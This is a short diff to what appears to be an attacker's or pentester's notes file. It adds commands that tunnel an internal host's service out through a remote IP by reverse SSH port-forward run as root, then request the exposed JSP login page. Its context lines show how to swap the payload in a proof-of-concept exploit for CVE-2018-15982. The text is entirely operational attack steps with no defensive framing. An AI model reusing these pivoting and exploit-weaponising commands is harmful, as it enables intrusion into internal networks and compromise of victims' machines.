@@ -38,6 +38,10 @@
 
 ## New features
 ```
+# ssh2
+py2  py/rforward.py -r 192.168.10.115:8083 -p 9999 -u root 12.19.16.11:27449
+curl http://162.219.126.11:9999/QIMS/login.jsp -v
+
 # how use exploit CVE-2018-15982
 
 py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'
